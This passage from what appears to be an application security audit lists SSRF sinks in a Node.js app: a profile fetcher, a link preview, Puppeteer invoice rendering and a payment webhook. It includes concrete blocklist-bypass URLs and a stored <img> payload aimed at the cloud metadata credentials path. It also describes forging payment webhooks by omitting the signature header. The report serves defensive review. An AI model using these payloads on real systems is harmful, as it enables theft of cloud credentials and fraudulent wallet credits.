  const parsed = new URL(url);
  const transport = parsed.protocol === 'https:' ? https : http;
  // Response parsed as JSON, specific fields extracted and returned
}
```

**Response returned:** Yes — if target returns valid JSON, fields named `name`, `bio`, `skills`, `location`, `website`, `avatar` are extracted and returned. Error messages also leak connectivity information.
**Reachable targets:** Same as Sink #1. Particularly effective against JSON-serving internal APIs.
**Attack method:** GET — more versatile for probing internal HTTP APIs.
**Severity:** CRITICAL

### SSRF Sink #3: Link Preview — SSRF with Bypassable Blocklist

**File:** `src/messaging/messaging.service.js`, lines 367-422
**Route:** `POST /api/messages/conversations/:id/link-preview` (authenticated)
**User Input:** `req.body.url` — attacker-controlled

```javascript
function fetchLinkPreview(url) {
  if (parsed.hostname === 'localhost' || parsed.hostname === '127.0.0.1') {
    return reject(new Error('Cannot fetch local URLs'));
  }
  var client = parsed.protocol === 'https:' ? https : http;
  var req = client.get(url, { timeout: 5000 }, function(res) { ... });
}
```

**Validation:** Weak — only blocks exact string match of `localhost` and `127.0.0.1`.
**Bypass techniques:**
- IPv6 loopback: `http://[::1]/`
- Alternative loopback IPs: `http://127.0.0.2/`, `http://0.0.0.0/`
- Decimal/hex IP: `http://2130706433/`, `http://0x7f000001/`
- Octal IP: `http://0177.0.0.1/`
- Docker service names: `http://postgres:5432/`, `http://redis:6379/`, `http://minio:9000/`
- Private ranges: `http://10.0.0.1/`, `http://172.16.0.1/`, `http://192.168.1.1/`
- Cloud metadata: `http://169.254.169.254/latest/meta-data/`
- DNS rebinding: attacker-controlled domain resolving to internal IPs

**Response returned:** Yes — HTML is parsed for Open Graph tags (`og:title`, `og:description`, `og:image`) and `<title>` content (up to 500KB read).
**Severity:** HIGH

### SSRF Sink #4: Puppeteer PDF Generation (Stored/Second-Order)

**File:** `src/utils/pdf.js`, lines 14-16
**Route:** `GET /api/contracts/:id/invoice` (authenticated)
**User Input:** `display_name` (via registration), `milestone.title` (via contract creation) — stored in database, injected into HTML rendered by Puppeteer

```javascript
const html = buildInvoiceHTML(invoiceData);
await page.setContent(html, { waitUntil: 'networkidle0' });
```

**Validation:** NONE — no HTML escaping on interpolated values.
**`waitUntil: 'networkidle0'`** means Puppeteer waits for all network requests to complete, so injected `<img>`, `<script>`, `<link>`, or `<iframe>` tags with internal URLs will be fetched.
**Chromium runs with `--no-sandbox`** (line 10), increasing the impact of any browser exploit.
**Attack scenario:** Set `display_name` to `<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">` — when any contract involving this user generates an invoice, the internal resource is fetched.
**Severity:** HIGH (requires stored payload via user registration or contract creation)

### SSRF Sink #5: Payment Webhook — Authentication Bypass (Related)

**File:** `src/integrations/webhook.service.js`, lines 14-29
**Route:** `POST /api/webhooks/payment` (public, no auth)

```javascript
const signature = headers['x-payment-signature'];
if (signature) {
  // Verification only if header present
}
```

While not a traditional SSRF sink, this webhook endpoint's optional signature verification allows an external attacker to forge payment events and credit arbitrary wallet amounts. The webhook processes `event` and `data` fields from the request body, including `data.user_id` and `data.amount`, without authentication when the `x-payment-signature` header is omitted.
**Severity:** CRITICAL (authentication bypass on financial endpoint)
